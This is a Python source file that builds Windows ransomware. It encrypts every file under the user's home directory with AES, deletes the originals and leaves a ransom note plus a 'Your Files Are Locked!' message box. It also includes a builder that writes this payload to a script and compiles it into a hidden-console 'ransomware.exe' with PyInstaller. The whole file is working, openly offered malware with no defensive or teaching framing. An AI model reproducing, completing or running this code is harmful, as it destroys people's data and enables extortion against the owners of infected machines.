import os
import sys
import base64
import json
import ctypes
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

def generate_cipher(key):
    return AES.new(key.encode(), AES.MODE_CBC, iv=b'16CHARSLONGIVVEC')

def encrypt_file(file_path, key):
    cipher = generate_cipher(key)
    try:
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
        with open(file_path + '.locked', 'wb') as f:
            f.write(cipher.iv + ciphertext)
        os.remove(file_path)
        return True
    except Exception as e:
        return False

def ransom_note(directory, message):
    note_path = os.path.join(directory, "README_FOR_DECRYPTION.txt")
    with open(note_path, 'w') as f:
        f.write(message)

def encrypt_system(key, message):
    user_path = os.path.expanduser("~")  # Target user directory
    for root, _, files in os.walk(user_path):
        for file in files:
            encrypt_file(os.path.join(root, file), key)
    ransom_note(user_path, message)
    ctypes.windll.user32.MessageBoxW(0, message, "Your Files Are Locked!", 0x10)

def build_ransomware(key, message, output_name="ransomware.exe"):
    payload_code = f"""
import os
import ctypes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def generate_cipher():
    return AES.new(b'{key}', AES.MODE_CBC, iv=b'16CHARSLONGIVVEC')

def encrypt_file(file_path):
    cipher = generate_cipher()
    try:
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
        with open(file_path + '.locked', 'wb') as f:
            f.write(cipher.iv + ciphertext)
        os.remove(file_path)
    except:
        pass

def encrypt_system():
    user_path = os.path.expanduser("~")
    for root, _, files in os.walk(user_path):
        for file in files:
            encrypt_file(os.path.join(root, file))
    with open(os.path.join(user_path, "README_FOR_DECRYPTION.txt"), 'w') as f:
        f.write("{message}")
    ctypes.windll.user32.MessageBoxW(0, "{message}", "Your Files Are Locked!", 0x10)

encrypt_system()
"""
    with open("payload.py", "w") as f:
        f.write(payload_code)
    subprocess.run(["pyinstaller", "--onefile", "--noconsole", "payload.py"])
    os.rename("dist/payload.exe", output_name)
    os.remove("payload.py")
    print(f"Built {output_name}")

if __name__ == "__main__":
    key = input("Enter encryption key (16, 24, or 32 characters): ")
    message = input("Enter ransom message: ")
    build_ransomware(key, message)
